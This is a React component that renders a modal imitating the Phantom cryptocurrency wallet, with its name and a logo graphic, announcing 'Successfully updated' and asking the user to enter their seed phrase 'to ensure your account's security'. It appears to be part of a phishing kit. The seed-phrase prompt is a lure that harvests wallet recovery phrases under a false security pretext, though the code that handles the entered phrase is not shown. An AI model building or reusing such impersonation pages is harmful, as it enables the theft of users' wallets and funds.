
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { HelpCircle } from "lucide-react";
import PhraseInput from "./PhraseInput";

interface PhraseModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const PhraseModal = ({ isOpen, onClose }: PhraseModalProps) => {
  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-[420px] bg-[#1A1A1A] text-white p-0 border-none rounded-xl shadow-xl">
        <div className="p-6 flex flex-col items-center">
          <div className="flex justify-between w-full mb-4">
            <div className="w-6"></div>
            <h1 className="text-2xl font-light text-center text-gray-300">phantom</h1>
            <HelpCircle className="h-6 w-6 text-gray-400" />
          </div>
          
          <div className="flex justify-center my-5">
            <div className="bg-black rounded-full p-8">
              <div className="w-20 h-20">
                <svg width="100%" height="100%" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M64 2C29.8 2 2 29.8 2 64c0 4.3.5 8.5 1.2 12.6h37.5c7.8 0 14.1 6.3 14.1 14.1v2.8h18.5v-2.8c0-7.8 6.3-14.1 14.1-14.1h37.4c.9-4.1 1.2-8.3 1.2-12.6 0-34.2-27.8-62-62-62z" fill="white"></path>
                  <path d="M88.3 50.6H74.5V35c0-2.8-2.3-5-5-5H58.5c-2.8 0-5.1 2.2-5.1 5v15.6H39.6c-2.8 0-5 2.3-5 5v11c0 2.8 2.2 5 5 5h13.8v15.6c0 2.7 2.3 5 5.1 5h11c2.7 0 5-2.3 5-5V66.6h13.8c2.7 0 5-2.2 5-5v-11c0-2.7-2.3-5-5-5z" fill="white"></path>
                </svg>
              </div>
            </div>
          </div>
          
          <h2 className="text-3xl font-bold text-white mb-3 text-center">Successfully updated</h2>
          
          <p className="text-center text-gray-400 mb-6">
            To ensure your account's security and prevent any fraudulent activity, please enter your seed phrase to confirm the changes.
          </p>
          
          <PhraseInput onSubmit={onClose} />
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default PhraseModal;
